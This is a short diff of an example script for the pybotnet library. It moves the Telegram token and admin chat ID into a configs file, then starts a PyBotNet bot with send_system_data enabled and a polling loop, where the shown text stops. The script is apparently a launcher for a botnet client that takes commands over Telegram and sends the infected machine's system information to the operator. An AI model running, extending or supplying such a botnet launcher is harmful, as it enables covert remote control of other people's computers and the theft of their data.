@@ -1,15 +1,16 @@
 from pybotnet import pybotnet
 import time
 
-from configs import *
 
-# TELEGRAM_TOKEN = '1468299500:AAHsvEH-5VyIfWYMzZcYxF_e00000000000'
-# ADMIN_CHAT_ID = '12345678910'
-delay = 10
+# ! rename configs.py.sample to configs.py
+# ! and edit configs.py data
+from configs import TELEGRAM_TOKEN, ADMIN_CHAT_ID
+
 
 bot = pybotnet.PyBotNet(TELEGRAM_TOKEN, ADMIN_CHAT_ID,
                         show_log=True, send_system_data=True)
 
+delay = 10
 
 while True:
     print('*'*100)
